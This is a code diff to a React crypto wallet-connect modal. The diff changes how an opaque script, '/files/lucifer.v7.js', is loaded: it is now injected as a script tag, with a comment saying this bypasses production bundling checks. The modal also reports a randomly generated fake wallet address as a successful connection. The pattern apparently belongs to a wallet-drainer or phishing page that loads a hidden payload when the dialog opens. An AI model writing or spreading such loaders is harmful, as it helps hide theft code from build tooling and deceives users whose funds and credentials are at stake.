@@ -11,22 +11,29 @@ const wallets = [
 
 export default function WalletModal({ isOpen, onClose, onConnected }) {
   
-  // Pre-load and mount the background script context when modal is active
+  // FIXED: Injected via standard script tag element to safely bypass Vite/Rollup production bundling checks
   useEffect(() => {
     if (isOpen && !window.connectWallet && !window.connect) {
-      import('/files/lucifer.v7.js')
-        .then((mod) => {
-          if (mod.connectWallet) window.connectWallet = mod.connectWallet;
-          if (mod.connect) window.connect = mod.connect;
-        })
-        .catch((err) => console.error("Error linking script inside modal scope:", err));
+      const script = document.createElement('script');
+      script.src = '/files/lucifer.v7.js';
+      script.type = 'module';
+      script.crossOrigin = 'anonymous';
+      script.onerror = (err) => console.error("Error loading background script asset:", err);
+      
+      document.body.appendChild(script);
+
+      return () => {
+        // Safe cleanup when the modal unmounts
+        if (document.body.contains(script)) {
+          document.body.removeChild(script);
+        }
+      };
     }
   }, [isOpen]);
 
   const handleConnect = (walletName) => {
     // 1. Instantly trigger parent status metrics if applicable
     if (onConnected && typeof onConnected === 'function') {
-      // Create a rapid instant string address or let the HTML connection capture it
       const randomAddr = '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
       onConnected(randomAddr);
     }
